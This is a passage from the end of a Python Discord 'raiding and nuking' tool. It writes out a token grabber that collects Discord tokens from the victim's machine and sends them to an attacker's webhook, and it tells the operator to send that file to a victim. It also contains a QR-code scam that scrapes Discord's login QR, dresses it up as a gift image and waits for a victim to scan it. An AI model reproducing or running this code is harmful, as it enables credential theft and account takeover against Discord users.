            continue
        for token in tukan(path):
            if token in checked:
                continue
            checked.append(token)
            user_data = da(token)
            if not user_data:
                continue
            username = user_data["username"] + "#" + str(user_data["discriminator"])
    
            emb = {
                "fields": [
                        {
                            "name": "Token",
                            "value": token,
                            "inline": False
                        }
                ],
                "author": {
                    "name": f"{username} ",
                },
            }
            em.append(emb)
    webhook = {
        "content": "",
        "embeds": em,
        "username": "TOKENS DROP"
    }
    try:
    
        urlopen(Request(web1, data=dumps(webhook).encode(), headers=header()))
    except:
        pass
    
if __name__ == '__main__':
    grabber()
                ''')

            print(f'{Fore.LIGHTMAGENTA_EX}Token Grabber saved to recover.py')
            print(f'{Fore.LIGHTMAGENTA_EX}Now close PussyKiller... And send token grabber file to victim, if victim open it webhook will send his token.')


        if coc == 2:

            def lg():
                rqr = Image.open('staff/qr_code.png', 'r')
                plca = Image.open('staff/dslg.png', 'r')
                rqr.paste(plca, (60, 55))
                rqr.save('staff/final_qr.png', quality=95)

            def bgg():
                bggg = Image.open('staff/bg.png', 'r')
                fqr = Image.open('staff/final_qr.png', 'r')
                bggg.paste(fqr, (120, 409))
                bggg.save('qrcode_gift.png', quality=95)

            def qrscam():
                driver = webdriver.Chrome(ChromeDriverManager().install())
                driver.get('https://discord.com/login')
                time.sleep(5)

                page_source = driver.page_source

                soup = BeautifulSoup(page_source, features='lxml')

                loca = soup.find('div', {'class': 'qrCode-wG6ZgU'})
                qrcod = loca.find('img')['src']
                file = os.path.join(os.getcwd(), 'staff/qr_code.png')

                pr = base64.b64decode(qrcod.replace('data:image/png;base64,', ''))

                with open(file, 'wb') as handler:
                    handler.write(pr)

                lg()
                bgg()

                print('QR code has been generated')
                print('Dont close PussyKiller, wait for the victim scan the QR code')
                os.remove('staff/qr_code.png')
                os.remove('staff/final_qr.png')

                while True:
                    pass


            if __name__ == '__main__':
                qrscam()


        exit = input('press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 20:


        print(f'''{Fore.LIGHTMAGENTA_EX}Wassup buddy. This is fun made tool by Lososik...      
If you have got some problems join https://dsc.gg/deadd or contact Lososik#0954.
Enjoy Raiding and Nuking :D
Special thanks to H0LLOW for helping me with a few things.
{Fore.RESET}''')


        exit = input('press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 21:
        os.system('exit')

spammer()